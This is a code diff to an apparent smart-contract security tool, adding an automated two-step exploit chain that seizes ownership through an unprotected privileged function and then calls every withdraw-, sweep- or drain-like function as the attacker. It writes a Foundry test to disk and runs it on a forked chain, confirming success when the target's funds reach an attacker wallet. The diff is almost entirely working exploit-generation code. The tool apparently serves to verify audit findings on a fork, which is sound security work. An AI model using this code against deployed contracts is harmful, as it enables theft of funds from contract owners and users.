@@ -348,6 +348,84 @@ def parse_outcome(finding, stdout: str) -> PayloadVerdict:
     return mk("manual", "unauthorized call does NOT revert - no funds moved to the wallet generically; confirm the impact by hand")
 
 
+# ---------------------------------------------------------------------------------------------
+# Multi-step exploit chains. A one-shot call rarely confirms a real bug: the common privileged-function
+# theft is TWO steps - seize ownership/role, THEN call a drain. This builds that chain and confirms only
+# when the full sequence moves the target's funds to the wallet (strict 200% differential), so a CONFIRMED
+# here is a fork-proven drain, not a candidate.
+_DRAIN_NAME_RE = re.compile(
+    r"withdraw|sweep|rescue|emergenc|drain|skim|collect|redeem|claim|payout|release|retriev|recover"
+    r"|salvage|unwrap|exit|disburse|flush|seize|transfer|send|mint|burn|liquidat|cashout|refund|take",
+    re.I)
+
+
+def _drain_candidates(contract, exclude=None, limit=14):
+    """Public/external state-changing functions whose name suggests they move value out."""
+    out = []
+    for fn in getattr(contract, "functions", []) or []:
+        if fn is exclude or getattr(fn, "visibility", None) not in ("public", "external"):
+            continue
+        if not getattr(fn, "is_mutating", False) or not _encodable(fn):
+            continue
+        if _DRAIN_NAME_RE.search(fn.name or ""):
+            out.append(fn)
+        if len(out) >= limit:
+            break
+    return out
+
+
+def _contract_of(files, finding):
+    for f in files:
+        for c in f.contracts:
+            if c.name == finding.contract:
+                return c
+    return None
+
+
+def build_privilege_chain(finding, takeover_fn, contract, target: str, wallet: str = ATTACKER_WALLET):
+    """A takeover->drain chain: prank the wallet, fire the flagged privileged function (seize owner/role),
+    then fire every drain candidate as the now-privileged caller. Returns (solidity, tried_names) or
+    (None, []) when there is no drain to chain (the one-shot path then handles a direct drain)."""
+    if takeover_fn is None or not _encodable(takeover_fn) or contract is None:
+        return None, []
+    drains = _drain_candidates(contract, exclude=takeover_fn)
+    if not drains:
+        return None, []
+    body = _HEADER.format(target=_addr_literal(target), attacker=_addr_literal(wallet))
+    def enc(fn):
+        a = _args(fn, amount_param_hint=True)
+        return f'abi.encodeWithSignature("{canonical_sig(fn)}"' + (f", {a}" if a else "") + ")"
+    body += ("        uint256 aW = attacker.balance; uint256 aT = _tok(attacker);\n"
+             "        uint256 tW = TARGET.balance; uint256 tT = _tok(TARGET);\n"
+             "        vm.startPrank(attacker, attacker);\n"
+             f'        (bool okTake, ) = TARGET.call({enc(takeover_fn)});\n')
+    tried = []
+    for d in drains:
+        # low-level call, result ignored: a reverting drain attempt does not abort the sequence
+        body += f'        TARGET.call({enc(d)});\n'
+        tried.append(d.name)
+    body += ("        vm.stopPrank();\n"
+             '        console2.log("CALL_OK", okTake);\n'
+             '        console2.log("ATTACKER_WEI_DELTA", int256(attacker.balance) - int256(aW));\n'
+             '        console2.log("TOKEN_DELTA", int256(_tok(attacker)) - int256(aT));\n'
+             '        console2.log("TARGET_WEI_DELTA", int256(TARGET.balance) - int256(tW));\n'
+             '        console2.log("TARGET_TOK_DELTA", int256(_tok(TARGET)) - int256(tT));\n')
+    return body + _FOOTER, tried
+
+
+def parse_chain_outcome(finding, stdout: str, tried: list) -> PayloadVerdict:
+    """Confirm only when the takeover->drain chain actually moved the target's funds to the wallet."""
+    v = parse_outcome(finding, stdout)
+    steps = ", ".join(tried[:8]) + ("…" if len(tried) > 8 else "")
+    if v.outcome == "confirmed":
+        v.detail = (f"takeover→drain chain CONFIRMED: seized `{finding.function}` then drained "
+                    f"{v.profit_wei} (wei/token) to {ATTACKER_WALLET} via [{steps}]")
+    elif v.outcome == "manual":
+        v.detail = (f"takeover `{finding.function}` succeeded but no drain moved funds "
+                    f"(tried [{steps}]) - needs a hand-written PoC")
+    return v
+
+
 def overflow_verdict(finding, fn, state_vars) -> PayloadVerdict:
     """Classify a pre-0.8 overflow finding into a sound injection tier and describe the Tier-1 crafted
     input - WITHOUT fabricating attacker state. Tier-1 overflows are real inputs the EVM would run;
@@ -726,6 +804,22 @@ def run_payloads(findings: list, files: list[SourceFile], target: str, rpc_url: 
             except Exception:
                 verdicts.append(static)
             continue
+        if f.detector == "unprotected-privileged-function" and fn is not None:
+            # Multi-step: seize ownership/role via the flagged fn, then drain. One forge run.
+            chain, tried = build_privilege_chain(f, fn, _contract_of(files, f), target, wallet)
+            if chain is not None:
+                (proj / "test" / "Exploit.t.sol").write_text(chain, encoding="utf-8")
+                cmd = [forge, "test", "--mp", "test/Exploit.t.sol", "--fork-url", rpc_url, "-vv"]
+                if fork_block:
+                    cmd += ["--fork-block-number", str(fork_block)]
+                try:
+                    r = subprocess.run(cmd, cwd=proj, capture_output=True, text=True, timeout=timeout)
+                    verdicts.append(parse_chain_outcome(f, r.stdout + "\n" + r.stderr, tried))
+                except subprocess.TimeoutExpired:
+                    verdicts.append(PayloadVerdict(f, "manual", "takeover→drain chain timed out; verify by hand"))
+                except Exception as exc:
+                    verdicts.append(PayloadVerdict(f, "error", f"forge run failed: {exc}"))
+                continue
         test = build_exploit(f, fn, target, wallet) if fn is not None else None
         if test is None:
             verdicts.append(PayloadVerdict(f, "manual", f"{f.detector}: no generic payload - verify by hand"))
